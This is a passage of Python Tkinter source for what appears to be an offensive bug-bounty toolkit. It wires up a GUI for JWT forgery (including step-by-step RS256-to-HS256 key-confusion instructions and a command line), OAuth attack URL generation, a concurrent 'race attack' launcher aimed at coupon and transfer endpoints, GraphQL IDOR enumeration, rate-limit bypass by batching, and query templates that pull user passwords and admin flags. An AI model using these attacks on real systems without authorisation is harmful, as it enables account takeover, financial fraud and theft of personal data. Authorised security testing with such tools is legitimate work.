            self._jatk_result.insert('end', "=== FORGED TOKEN ===\n\n")
            self._jatk_result.insert('end', f"Claims: {_json.dumps(claims, indent=2)}\n\n")
            self._jatk_result.insert('end', f"Signed: {r.get('signed', False)}\n\n")
            self._jatk_result.insert('end', r.get('token', ''))
        elif attack == 'rs256':
            self._jatk_result.insert('end', "RS256→HS256 Attack:\n\n")
            self._jatk_result.insert('end', "1. Fetch public key: GET /.well-known/jwks.json\n")
            self._jatk_result.insert('end', "2. Extract RSA public key PEM\n")
            self._jatk_result.insert('end', "3. Use public key as HS256 HMAC secret\n\n")
            self._jatk_result.insert('end', "Commands:\n")
            self._jatk_result.insert('end', "  python3 -c \"from modules.advanced.jwt_oauth import attack_rs256_hs256\n")
            self._jatk_result.insert('end', "  with open('pubkey.pem') as f: key = f.read()\n")
            self._jatk_result.insert('end', "  print(attack_rs256_hs256('TOKEN', key)['token'])\"\n")
        self._jatk_result.config(state='disabled')

    def _build_oauth_analyzer(self, frame):
        from modules.advanced import jwt_oauth as _jwt
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "OAUTH FLOW ANALYZER & ATTACK GENERATOR", "🔑").pack(fill='x', pady=(0,8))
        tk.Label(pad, text="OAuth Authorization URL:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,2))
        self._oauth_url = tk.Text(pad, height=3, bg=BG3, fg=CYAN, font=MONO_S,
                                   relief='flat', insertbackground=ACCENT, wrap='none')
        self._oauth_url.pack(fill='x', pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x', pady=(0,8))
        mk_btn(bf, "🔍 Analyze URL", lambda: self._oauth_analyze(), GREEN, small=True).pack(side='left', padx=4)
        mk_btn(bf, "⚔ Generate Attack URLs", lambda: self._oauth_attacks(), RED, small=True).pack(side='left', padx=4)
        tk.Label(pad, text="JWKS Domain:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._jwks_domain = tk.StringVar()
        mk_entry(pad, var=self._jwks_domain, w=26).pack(side='left', ipady=3)
        mk_btn(pad, "🔍 Fetch JWKS", lambda: self._fetch_jwks(), CYAN, small=True).pack(side='left', padx=4)
        self._oauth_result = mk_stext(pad, h=24, bg=BG3, fg=FG)
        self._oauth_result.pack(fill='both', expand=True)

    def _oauth_analyze(self):
        from modules.advanced import jwt_oauth as _jwt
        import json as _json
        url = self._oauth_url.get('1.0','end').strip()
        if not url: return
        r = _jwt.analyze_oauth_url(url)
        self._oauth_result.config(state='normal'); self._oauth_result.delete('1.0','end')
        if r.get('error'): self._oauth_result.insert('end', f"Error: {r['error']}\n"); self._oauth_result.config(state='disabled'); return
        self._oauth_result.insert('end', "=== OAUTH PARAMETERS ===\n")
        for k, v in r.get('params', {}).items():
            self._oauth_result.insert('end', f"  {k}: {v}\n")
        self._oauth_result.insert('end', f"\n=== SECURITY ISSUES ({len(r.get('issues',[]))}) ===\n")
        for iss in r.get('issues', []):
            sev = iss.get('severity','INFO')
            icon = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢','INFO':'ℹ'}.get(sev,'•')
            self._oauth_result.insert('end', f"  {icon} [{sev}] {iss.get('issue','')}\n")
            for test in iss.get('tests', []):
                self._oauth_result.insert('end', f"      ↳ {test}\n")
        self._oauth_result.config(state='disabled')
        self.set_status(f"OAuth: {len(r.get('issues',[]))} issues", RED if r.get('issues') else GREEN)

    def _oauth_attacks(self):
        from modules.advanced import jwt_oauth as _jwt
        url = self._oauth_url.get('1.0','end').strip()
        if not url: return
        r = _jwt.generate_oauth_attacks(url)
        self._oauth_result.config(state='normal'); self._oauth_result.delete('1.0','end')
        self._oauth_result.insert('end', "=== OAUTH ATTACK URLS ===\n\n")
        for name, attack_url in r.get('attacks', {}).items():
            self._oauth_result.insert('end', f"[{name}]\n{attack_url}\n\n")
        self._oauth_result.config(state='disabled')

    def _fetch_jwks(self):
        from modules.advanced import jwt_oauth as _jwt
        import json as _json
        domain = self._jwks_domain.get().strip()
        if not domain: return
        self.set_status(f"Fetching JWKS from {domain}...", CYAN)
        def _go():
            r = _jwt.fetch_jwks(domain)
            def _upd():
                self._oauth_result.config(state='normal')
                self._oauth_result.delete('1.0','end')
                if r.get('found'):
                    self._oauth_result.insert('end', f"✅ JWKS found at: {r['url']}\n\n")
                    self._oauth_result.insert('end', _json.dumps(r.get('data',{}), indent=2)[:3000])
                else:
                    self._oauth_result.insert('end', "JWKS not found at common paths:\n")
                    for u in r.get('tried',[]): self._oauth_result.insert('end', f"  {u}\n")
                self._oauth_result.config(state='disabled')
                self.set_status(f"JWKS: {'found' if r.get('found') else 'not found'}", GREEN if r.get('found') else YELLOW)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_session_analyzer(self, frame):
        from modules.advanced import jwt_oauth as _jwt
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "SESSION TOKEN ANALYZER", "🍪").pack(fill='x', pady=(0,8))
        tk.Label(pad, text="Session Token / Cookie Value:", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,2))
        self._sess_token = tk.StringVar()
        mk_entry(pad, var=self._sess_token, w=70).pack(fill='x', pady=(0,8), ipady=4)
        mk_btn(pad, "🔍 Analyze Token", self._analyze_session_token, GREEN, small=True).pack(anchor='w', pady=(0,8))
        self._sess_result = mk_stext(pad, h=24, bg=BG3, fg=FG)
        self._sess_result.pack(fill='both', expand=True)

    def _analyze_session_token(self):
        from modules.advanced import jwt_oauth as _jwt
        import json as _json
        token = self._sess_token.get().strip()
        if not token: return
        r = _jwt.analyze_session_token(token)
        self._sess_result.config(state='normal'); self._sess_result.delete('1.0','end')
        self._sess_result.insert('end', f"Length:        {r.get('length','')}\n")
        self._sess_result.insert('end', f"Unique chars:  {r.get('unique_chars','')}\n\n")
        issues = r.get('issues', [])
        self._sess_result.insert('end', f"=== SECURITY ISSUES ({len(issues)}) ===\n\n")
        for iss in issues:
            sev = iss.get('severity','INFO')
            icon = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢','INFO':'ℹ'}.get(sev,'•')
            self._sess_result.insert('end', f"  {icon} [{sev}] {iss.get('issue','')}\n")
        self._sess_result.config(state='disabled')
        self.set_status(f"Session: {len(issues)} issues", RED if any(i.get('severity') in ('CRITICAL','HIGH') for i in issues) else GREEN)

    # ═════════════════════════════════════════════════════════════
    #  RACE CONDITION TAB
    # ═════════════════════════════════════════════════════════════
    def _build_race_tab(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  ⚡ Concurrent Tester  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  📖 Scenarios Library  ")
        self._build_race_tester(f1)
        self._build_race_scenarios(f2)

    def _build_race_tester(self, frame):
        from modules.advanced import race_condition as _rc
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "RACE CONDITION TESTER", "⚡").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Sends N concurrent requests simultaneously to detect race conditions\n"
            "  Targets: Double-spend  •  Coupon reuse  •  Rate limit bypass  •  Free upgrades\n"
            "  HTTP/1.1 mode: synchronized via threading barrier (all threads start at same time)"
        ), bg=BG3, fg=FG2, font=MONO_S, justify='left').pack(anchor='w', padx=12, pady=8)

        # Config
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,6))
        tk.Label(tr, text="Target URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._race_url = tk.StringVar(value=f"https://{self.project.get()}/api/coupon/apply" if self.project.get() else "")
        mk_entry(tr, var=self._race_url, w=46).pack(side='left', padx=8, ipady=3)

        r2 = mk_frame(pad, bg=BG2); r2.pack(fill='x', pady=(0,6))
        tk.Label(r2, text="Method:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._race_method = tk.StringVar(value="POST")
        ttk.Combobox(r2, textvariable=self._race_method, values=["POST","GET","PUT","PATCH"], width=7, font=MONO_S).pack(side='left', padx=8)
        tk.Label(r2, text="Concurrent Requests:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left', padx=(12,4))
        self._race_n = tk.StringVar(value="20")
        ttk.Combobox(r2, textvariable=self._race_n, values=["5","10","20","50","100"], width=6, font=MONO_S).pack(side='left')

        tk.Label(pad, text="Request Body (JSON):", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(6,2))
        self._race_body = tk.Text(pad, height=3, bg=BG3, fg=FG, font=MONO_S,
                                   relief='flat', insertbackground=ACCENT, wrap='none')
        self._race_body.insert('end', '{"coupon_code":"SAVE50","user_id":1}')
        self._race_body.pack(fill='x', pady=(0,6))

        tk.Label(pad, text="Auth Header (optional):", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,2))
        self._race_auth = tk.StringVar(value="Authorization: Bearer YOUR_TOKEN")
        mk_entry(pad, var=self._race_auth, w=60).pack(fill='x', ipady=3, pady=(0,8))

        self._race_result_lbl = tk.Label(pad, text="", bg=BG2, fg=FG, font=MONO_B)
        self._race_result_lbl.pack(anchor='w', pady=(0,4))
        self._race_txt = mk_stext(pad, h=14, bg=BG3, fg=FG)
        self._race_txt.pack(fill='both', expand=True, pady=(0,8))

        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_race():
            url    = self._race_url.get().strip()
            method = self._race_method.get()
            body   = self._race_body.get('1.0','end').strip()
            try: n = int(self._race_n.get())
            except: n = 20
            auth = self._race_auth.get().strip()
            headers = {}
            if auth and ':' in auth:
                k, v = auth.split(':', 1)
                headers[k.strip()] = v.strip()
            if not url:
                messagebox.showwarning("No Target", "Enter a target URL first.\nExample: https://example.com/api/transfer", parent=self.root); return
            self._race_result_lbl.config(text=f"⏳ Sending {n} concurrent requests...", fg=CYAN)
            self._race_txt.config(state='normal'); self._race_txt.delete('1.0','end')
            self._race_txt.config(state='disabled')
            def _go():
                tester = _rc.ConcurrentRaceTester(url, method, headers, body)
                result = tester.run(n)
                # Save result
                proj = self.project.get() or url.replace('https://','').replace('http://','').split('/')[0]
                saved = _rc.save_result(url, "concurrent_test", result, LOGS_DIR / proj)
                def _upd():
                    import json as _json
                    self._race_txt.config(state='normal')
                    msg = result.get('message','')
                    clr = RED if result.get('race_detected') else (YELLOW if result.get('race_possible') else GREEN)
                    self._race_result_lbl.config(text=msg, fg=clr)
                    stats = (f"Sent: {result['total_sent']}  |  "
                             f"Responses: {result['responses']}  |  "
                             f"Statuses: {result['status_counts']}  |  "
                             f"Time: {result['elapsed_ms']}ms")
                    self._race_txt.insert('end', stats + '\n\n')
                    for r2 in result.get('results',[]):
                        status = r2.get('status',0)
                        elapsed = r2.get('elapsed_ms',0)
                        body_prev = r2.get('body','')[:60]
                        line = f"  [{r2['idx']:2d}] {status}  {elapsed:.0f}ms  {body_prev}"
                        self._race_txt.insert('end', line + '\n')
                    self._race_txt.insert('end', f"\n[✓] Saved: {saved}\n")
                    self._race_txt.config(state='disabled')
                    self.set_status(msg, clr)
                self.root.after(0, _upd)
            threading.Thread(target=_go, daemon=True).start()

        mk_btn(bf, "⚡ Launch Race Attack", run_race, RED).pack(side='left', padx=4, ipady=6)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._race_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _build_race_scenarios(self, frame):
        from modules.advanced import race_condition as _rc
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "HIGH-VALUE RACE CONDITION SCENARIOS", "📖").pack(fill='x', pady=(0,8))
        # Paned: scenario list + detail
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)
        left = mk_frame(paned, bg=BG2); paned.add(left, width=230)
        scenarios = _rc.get_scenarios()
        scen_lb = tk.Listbox(left, bg=BG3, fg=FG, font=MONO_S,
                              selectbackground=BG5, selectforeground=RED,
                              relief='flat', bd=0)
        vsb = ttk.Scrollbar(left, orient='vertical', command=scen_lb.yview)
        scen_lb.configure(yscrollcommand=vsb.set)
        scen_lb.pack(side='left', fill='both', expand=True)
        vsb.pack(side='right', fill='y')
        for name in scenarios.keys(): scen_lb.insert('end', name)
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        detail_txt = mk_stext(right, h=28, bg=BG3, fg=FG)
        detail_txt.pack(fill='both', expand=True)
        def on_select(_e=None):
            sel = scen_lb.curselection()
            if not sel: return
            name  = scen_lb.get(sel[0])
            scen  = scenarios.get(name, {})
            detail_txt.config(state='normal'); detail_txt.delete('1.0','end')
            hv = "🔴 HIGH VALUE" if scen.get('high_value') else "🟡 MEDIUM VALUE"
            detail_txt.insert('end', f"{name}\n{'═'*55}\n\n")
            detail_txt.insert('end', f"Value:       {hv}\n")
            detail_txt.insert('end', f"Method:      {scen.get('method','POST')}\n\n")
            detail_txt.insert('end', f"Description:\n  {scen.get('description','')}\n\n")
            detail_txt.insert('end', f"How to Test:\n  {scen.get('note','')}\n\n")
            detail_txt.insert('end', f"Impact:\n  {scen.get('impact','')}\n\n")
            detail_txt.insert('end', "=== STEPS TO EXPLOIT ===\n\n")
            detail_txt.insert('end', "1. Find the vulnerable endpoint in app\n")
            detail_txt.insert('end', "2. Capture the request in HTTP Replayer\n")
            detail_txt.insert('end', "3. Set Method & Body in Race Tester tab\n")
            detail_txt.insert('end', "4. Set concurrent requests to 20-50\n")
            detail_txt.insert('end', "5. Click 'Launch Race Attack'\n")
            detail_txt.insert('end', "6. Look for multiple 200 responses\n\n")
            detail_txt.insert('end', "=== BOUNTY EXPECTATION ===\n\n")
            if scen.get('high_value'):
                detail_txt.insert('end', "  $1,000 — $25,000+ (CRITICAL/HIGH)\n")
                detail_txt.insert('end', "  Financial impact = maximum bounty\n")
            else:
                detail_txt.insert('end', "  $200 — $5,000 (MEDIUM/HIGH)\n")
            detail_txt.config(state='disabled')
            # Pre-fill race tester
            if hasattr(self, '_race_method'): self._race_method.set(scen.get('method','POST'))
        scen_lb.bind('<<ListboxSelect>>', on_select)
        if scen_lb.size(): scen_lb.selection_set(0); on_select()

    # ═════════════════════════════════════════════════════════════
    #  GRAPHQL TESTER TAB
    # ═════════════════════════════════════════════════════════════
    def _build_graphql_tab(self, frame):
        frame.configure(bg=BG2)
        nb2 = ttk.Notebook(frame); nb2.pack(fill='both', expand=True)
        f1 = tk.Frame(nb2, bg=BG2); nb2.add(f1, text="  🔍 Endpoint Finder  ")
        f2 = tk.Frame(nb2, bg=BG2); nb2.add(f2, text="  📋 Introspection  ")
        f3 = tk.Frame(nb2, bg=BG2); nb2.add(f3, text="  ⚔ Attack Suite  ")
        f4 = tk.Frame(nb2, bg=BG2); nb2.add(f4, text="  🧪 Query Builder  ")
        self._build_gql_finder(f1)
        self._build_gql_introspection(f2)
        self._build_gql_attacks(f3)
        self._build_gql_query_builder(f4)

    def _build_gql_finder(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "GRAPHQL ENDPOINT FINDER + FULL AUDIT", "🔍").pack(fill='x', pady=(0,8))
        info = mk_card(pad); info.pack(fill='x', pady=(0,8))
        tk.Label(info, text=(
            "  Scans 15+ common GraphQL paths  •  Runs complete security audit\n"
            "  Tests: Introspection  •  Batching  •  Field suggestions  •  Depth limits  •  Injection"
        ), bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', padx=12, pady=8)
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Target URL:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_target = tk.StringVar(value=f"https://{self.project.get()}" if self.project.get() else "")
        mk_entry(tr, var=self._gql_target, w=46).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "← Project", lambda: self._gql_target.set(f"https://{self.project.get()}"), FG3, small=True).pack(side='left')
        # Auth
        auth_f = mk_frame(pad, bg=BG2); auth_f.pack(fill='x', pady=(0,8))
        tk.Label(auth_f, text="Authorization:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_auth = tk.StringVar(value="Bearer YOUR_TOKEN")
        mk_entry(auth_f, var=self._gql_auth, w=40).pack(side='left', padx=8, ipady=3)
        self._gql_find_txt = mk_stext(pad, h=20, bg=BG3, fg=FG)
        self._gql_find_txt.pack(fill='both', expand=True, pady=(0,8))
        bf = mk_frame(pad, bg=BG2); bf.pack(fill='x')
        def run_audit():
            from modules.advanced import graphql_tester as _gql
            target = self._gql_target.get().strip()
            if not target: return
            auth   = self._gql_auth.get().strip()
            headers = {"Authorization": auth} if auth and auth != "Bearer YOUR_TOKEN" else {}
            self._gql_find_txt.config(state='normal'); self._gql_find_txt.delete('1.0','end')
            self._gql_find_txt.insert('end', f"[*] Finding GraphQL endpoints on {target}...\n\n")
            self._gql_find_txt.config(state='disabled')
            def log_cb(msg, tag='info'):
                self._gql_find_txt.config(state='normal')
                self._gql_find_txt.insert('end', msg + '\n')
                self._gql_find_txt.see('end')
                self._gql_find_txt.config(state='disabled')
            def _go():
                found = _gql.detect_endpoint(target, log_cb)
                if found:
                    ep = found[0]['url']
                    if hasattr(self, '_gql_ep_var'): self.root.after(0, lambda: self._gql_ep_var.set(ep))
                    # Run full audit
                    self.root.after(0, lambda: log_cb(f"\n[*] Running full audit on {ep}...", 'info'))
                    result = _gql.full_audit(ep, headers, log_cb)
                    def _done():
                        self._gql_find_txt.config(state='normal')
                        self._gql_find_txt.insert('end', f"\n\n=== AUDIT COMPLETE: {result['total_findings']} findings ===\n")
                        for finding in result.get('findings', []):
                            sev = finding.get('severity','INFO')
                            icon = {'CRITICAL':'🔴','HIGH':'🟠','MEDIUM':'🟡','LOW':'🟢','INFO':'ℹ'}.get(sev,'•')
                            self._gql_find_txt.insert('end', f"  {icon} [{sev}] {finding['title']}: {finding['detail']}\n")
                        self._gql_find_txt.config(state='disabled')
                        self.set_status(f"GraphQL: {len(found)} endpoints, {result['total_findings']} findings",
                                        RED if result['total_findings'] > 0 else GREEN)
                    self.root.after(0, _done)
                else:
                    self.root.after(0, lambda: log_cb("\n[!] No GraphQL endpoints found", 'warn'))
            threading.Thread(target=_go, daemon=True).start()
        mk_btn(bf, "🔍 Find & Full Audit", run_audit, GREEN).pack(side='left', padx=4, ipady=6)
        mk_btn(bf, "📋 Copy", lambda: (self.root.clipboard_clear(),
            self.root.clipboard_append(self._gql_find_txt.get('1.0','end'))), ACCENT, small=True).pack(side='left', padx=4)

    def _build_gql_introspection(self, frame):
        from modules.advanced import graphql_tester as _gql
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "INTROSPECTION DUMP & SCHEMA EXPLORER", "📋").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_ep_var = tk.StringVar()
        mk_entry(tr, var=self._gql_ep_var, w=50).pack(side='left', padx=8, ipady=3)
        mk_btn(tr, "📋 Dump Schema", self._gql_introspect, GREEN, small=True).pack(side='left', padx=4)
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)
        left = mk_frame(paned, bg=BG2); paned.add(left, width=220)
        tk.Label(left, text="Types & Queries", bg=BG2, fg=ACCENT, font=MONO_B).pack(pady=(0,4), anchor='w')
        self._gql_types_lb = tk.Listbox(left, bg=BG3, fg=FG, font=MONO_S,
                                          selectbackground=BG5, relief='flat', bd=0)
        vsb = ttk.Scrollbar(left, orient='vertical', command=self._gql_types_lb.yview)
        self._gql_types_lb.configure(yscrollcommand=vsb.set)
        self._gql_types_lb.pack(side='left', fill='both', expand=True)
        vsb.pack(side='right', fill='y')
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        self._gql_schema_txt = mk_stext(right, h=28, bg=BG3, fg=FG)
        self._gql_schema_txt.pack(fill='both', expand=True)

    def _gql_introspect(self):
        from modules.advanced import graphql_tester as _gql
        import json as _json
        ep = self._gql_ep_var.get().strip()
        if not ep: return
        self._gql_schema_txt.config(state='normal')
        self._gql_schema_txt.delete('1.0','end')
        self._gql_schema_txt.insert('end', f"[*] Running introspection on {ep}...\n")
        self._gql_schema_txt.config(state='disabled')
        def _go():
            r = _gql.run_introspection(ep)
            def _upd():
                self._gql_types_lb.delete(0, 'end')
                self._gql_types_lb.insert('end', "=== QUERIES ===")
                for q in r.get('queries', []): self._gql_types_lb.insert('end', f"  {q}")
                self._gql_types_lb.insert('end', "=== MUTATIONS ===")
                for m in r.get('mutations', []): self._gql_types_lb.insert('end', f"  {m}")
                self._gql_types_lb.insert('end', "=== TYPES ===")
                for t in r.get('types', []): self._gql_types_lb.insert('end', f"  {t}")
                self._gql_schema_txt.config(state='normal')
                self._gql_schema_txt.delete('1.0','end')
                if r.get('introspection_enabled'):
                    self._gql_schema_txt.insert('end', f"✅ Introspection ENABLED\n\n")
                    self._gql_schema_txt.insert('end', f"Queries ({len(r.get('queries',[]))}): {', '.join(r.get('queries',[])[:10])}\n")
                    self._gql_schema_txt.insert('end', f"Mutations ({len(r.get('mutations',[]))}): {', '.join(r.get('mutations',[])[:10])}\n")
                    self._gql_schema_txt.insert('end', f"Types ({len(r.get('types',[]))}): {', '.join(r.get('types',[])[:20])}\n\n")
                    if r.get('sensitive_fields'):
                        self._gql_schema_txt.insert('end', f"🔴 SENSITIVE FIELDS:\n")
                        for sf in r['sensitive_fields']: self._gql_schema_txt.insert('end', f"  {sf}\n")
                    self._gql_schema_txt.insert('end', f"\n=== FULL SCHEMA ===\n\n")
                    self._gql_schema_txt.insert('end', _json.dumps(r.get('schema',{}), indent=2)[:5000])
                else:
                    self._gql_schema_txt.insert('end', "⚠ Introspection DISABLED or restricted\n\n")
                    self._gql_schema_txt.insert('end', r.get('raw_response','')[:500])
                self._gql_schema_txt.config(state='disabled')
                self.set_status(f"GraphQL introspection: {'enabled' if r.get('introspection_enabled') else 'disabled'}", RED if r.get('introspection_enabled') else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_gql_attacks(self, frame):
        from modules.advanced import graphql_tester as _gql
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "GRAPHQL ATTACK SUITE", "⚔").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_atk_ep = tk.StringVar()
        mk_entry(tr, var=self._gql_atk_ep, w=46).pack(side='left', padx=8, ipady=3)
        # IDOR
        idor_f = mk_card(pad); idor_f.pack(fill='x', pady=(0,8))
        idor_inner = mk_frame(idor_f, bg=BG3); idor_inner.pack(fill='x', padx=14, pady=10)
        tk.Label(idor_inner, text="IDOR via GraphQL — Query template (use 'ID' as placeholder):", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', pady=(0,4))
        self._gql_idor_q = tk.Text(idor_inner, height=2, bg=BG4, fg=FG, font=MONO_S,
                                    relief='flat', insertbackground=ACCENT)
        self._gql_idor_q.insert('end', 'query { user(id: ID) { id name email role isAdmin } }')
        self._gql_idor_q.pack(fill='x', pady=(0,6))
        ir = mk_frame(idor_inner, bg=BG3); ir.pack(fill='x')
        tk.Label(ir, text="ID Range:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_id_start = tk.StringVar(value="1"); self._gql_id_end = tk.StringVar(value="20")
        mk_entry(ir, var=self._gql_id_start, w=5).pack(side='left', padx=4, ipady=2)
        tk.Label(ir, text="to", bg=BG3, fg=FG3, font=MONO_S).pack(side='left', padx=4)
        mk_entry(ir, var=self._gql_id_end, w=5).pack(side='left', padx=4, ipady=2)
        mk_btn(ir, "⚔ Run IDOR Test", lambda: self._gql_run_idor(), RED, small=True).pack(side='left', padx=8)
        # Batching
        batch_f = mk_card(pad); batch_f.pack(fill='x', pady=(0,8))
        batch_inner = mk_frame(batch_f, bg=BG3); batch_inner.pack(fill='x', padx=14, pady=10)
        tk.Label(batch_inner, text="Batching Attack — bypass rate limiting:", bg=BG3, fg=FG2, font=MONO_S).pack(anchor='w', pady=(0,4))
        br = mk_frame(batch_inner, bg=BG3); br.pack(fill='x')
        tk.Label(br, text="Batch Count:", bg=BG3, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_batch_n = tk.StringVar(value="50")
        ttk.Combobox(br, textvariable=self._gql_batch_n, values=["10","25","50","100","500"], width=6, font=MONO_S).pack(side='left', padx=8)
        mk_btn(br, "⚡ Test Batching", lambda: self._gql_run_batch(), RED, small=True).pack(side='left', padx=4)
        # Output
        self._gql_atk_txt = mk_stext(pad, h=14, bg=BG3, fg=FG)
        self._gql_atk_txt.pack(fill='both', expand=True)

    def _gql_run_idor(self):
        from modules.advanced import graphql_tester as _gql
        ep    = self._gql_atk_ep.get().strip()
        query = self._gql_idor_q.get('1.0','end').strip()
        if not ep or not query: return
        try:
            start = int(self._gql_id_start.get()); end = int(self._gql_id_end.get())
        except Exception: start, end = 1, 20
        self._gql_atk_txt.config(state='normal'); self._gql_atk_txt.delete('1.0','end')
        self._gql_atk_txt.insert('end', f"[*] IDOR test on {ep} (IDs {start}-{end})...\n\n")
        self._gql_atk_txt.config(state='disabled')
        def _go():
            import json as _json
            r = _gql.test_idor_via_graphql(ep, query, range(start, end+1))
            def _upd():
                self._gql_atk_txt.config(state='normal')
                self._gql_atk_txt.insert('end', f"Result: {r.get('message','')}\n\n")
                for item in r.get('found', []):
                    self._gql_atk_txt.insert('end', f"  ID={item['id']}: {_json.dumps(item.get('data',{}))[:100]}\n")
                self._gql_atk_txt.config(state='disabled')
                self.set_status(f"GraphQL IDOR: {r.get('count',0)} records", RED if r.get('vulnerable') else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _gql_run_batch(self):
        from modules.advanced import graphql_tester as _gql
        ep = self._gql_atk_ep.get().strip()
        if not ep: return
        try: n = int(self._gql_batch_n.get())
        except: n = 50
        self._gql_atk_txt.config(state='normal'); self._gql_atk_txt.delete('1.0','end')
        self._gql_atk_txt.insert('end', f"[*] Batching attack: {n} queries in 1 request...\n\n")
        self._gql_atk_txt.config(state='disabled')
        def _go():
            r = _gql.test_batching_attack(ep, '{ __typename }', n)
            def _upd():
                self._gql_atk_txt.config(state='normal')
                self._gql_atk_txt.insert('end', f"Result: {r.get('message','')}\n")
                self._gql_atk_txt.insert('end', f"Sent: {r.get('batched',0)}  Responses: {r.get('responses',0)}\n")
                self._gql_atk_txt.insert('end', f"Time: {r.get('elapsed_ms',0)}ms\n")
                self._gql_atk_txt.config(state='disabled')
                self.set_status(f"GraphQL batching: {'VULNERABLE' if r.get('vulnerable') else 'limited'}", RED if r.get('vulnerable') else GREEN)
            self.root.after(0, _upd)
        threading.Thread(target=_go, daemon=True).start()

    def _build_gql_query_builder(self, frame):
        pad = mk_frame(frame, bg=BG2); pad.pack(fill='both', expand=True, padx=16, pady=12)
        mk_section(pad, "GRAPHQL QUERY BUILDER & SENDER", "🧪").pack(fill='x', pady=(0,8))
        tr = mk_frame(pad, bg=BG2); tr.pack(fill='x', pady=(0,8))
        tk.Label(tr, text="Endpoint:", bg=BG2, fg=FG3, font=MONO_S).pack(side='left')
        self._gql_qb_ep = tk.StringVar()
        mk_entry(tr, var=self._gql_qb_ep, w=46).pack(side='left', padx=8, ipady=3)
        paned = tk.PanedWindow(pad, orient='horizontal', bg=BG, sashwidth=5)
        paned.pack(fill='both', expand=True)
        left = mk_frame(paned, bg=BG2); paned.add(left, stretch='always')
        tk.Label(left, text="Query:", bg=BG2, fg=FG3, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._gql_query_txt = tk.Text(left, height=12, bg=BG3, fg='#8be9fd', font=MONO_S,
                                       relief='flat', insertbackground=ACCENT, wrap='none')
        self._gql_query_txt.insert('end', '{\n  users {\n    id\n    name\n    email\n    role\n    isAdmin\n  }\n}')
        self._gql_query_txt.pack(fill='both', expand=True, pady=(0,4))
        tk.Label(left, text="Variables (JSON):", bg=BG2, fg=FG3, font=MONO_S).pack(anchor='w', pady=(0,2))
        self._gql_vars_txt = tk.Text(left, height=4, bg=BG3, fg=FG, font=MONO_S,
                                      relief='flat', insertbackground=ACCENT)
        self._gql_vars_txt.insert('end', '{}')
        self._gql_vars_txt.pack(fill='x', pady=(0,6))
        mk_btn(left, "▶ Send Query", self._gql_send_query, GREEN, small=True).pack(anchor='w', pady=(0,4))
        right = mk_frame(paned, bg=BG2); paned.add(right, stretch='always')
        tk.Label(right, text="Response:", bg=BG2, fg=FG3, font=MONO_B).pack(anchor='w', pady=(0,4))
        self._gql_resp_txt = mk_stext(right, h=20, bg=BG3, fg=FG)
        self._gql_resp_txt.pack(fill='both', expand=True)
        # Template queries
        TEMPLATES = {
            "Basic Introspection": '{ __schema { types { name kind } } }',
            "Get all users":       '{ users { id name email role isAdmin password } }',
            "Me/Profile":          '{ me { id name email role permissions } }',
            "Admin users":         '{ users(filter:{role:"admin"}) { id name email } }',
